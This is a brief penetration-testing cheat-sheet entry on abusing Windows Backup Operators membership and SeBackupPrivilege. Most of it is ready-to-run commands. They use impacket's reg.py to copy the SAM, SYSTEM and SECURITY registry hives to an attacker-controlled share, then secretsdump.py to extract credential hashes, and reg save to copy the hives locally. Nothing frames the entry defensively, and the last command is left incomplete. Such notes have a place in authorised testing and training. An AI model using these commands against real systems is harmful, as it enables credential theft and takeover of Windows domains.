# Backup Operators

With this privilege, we can backup the SAM, SYSTEM, and SECURITY hives.

## From Linux

```powershell
# Download Hives
reg.py $DOMAIN/$USER:'$PASSWD'@$FQDN backup -o '//$OUR_IP/share'
reg.py $DOMAIN/$USER:'$PASSWD'@$FQDN backup -o '//$FQDN/C$/Users/$OUR_USER'

# Dump Hives
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```

## From Windows

```powershell
# Abusing SeBackupPrivilege
reg save hklm\sam C:\Users\Public\sam && reg save hklm\system C:\Users\Public\system

reg save hklm\sam
```
